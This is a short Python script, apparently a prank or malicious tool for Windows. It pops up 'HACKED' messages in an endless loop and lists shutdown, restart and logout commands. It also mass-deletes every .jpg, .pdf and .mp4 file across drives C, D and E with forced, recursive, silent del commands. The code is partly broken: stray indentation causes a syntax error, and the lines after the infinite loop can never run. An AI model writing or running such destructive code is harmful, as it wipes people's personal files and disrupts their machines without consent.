import os
from time import sleep

# Function to send a message
def message():
    os.system('msg * HACKED')

# Infinite loop to send the message every second
while True:
    message()
    sleep(1)

# Uncomment the following lines to use shutdown, restart, or logout commands
 os.system("shutdown /s /t 1")  # For shutdown your system
 os.system("shutdown /r /t 1")  # For restart your system
 os.system("shutdown -l")        # For logout your system

# To delete specific file types from specified drives
drivelist = ["C", "D", "E"]
for drive in drivelist:
    os.system(f"del {drive}\\*.jpg /f /s /q")
    os.system(f"del {drive}\\*.pdf /f /s /q")
    os.system(f"del {drive}\\*.mp4 /f /s /q")
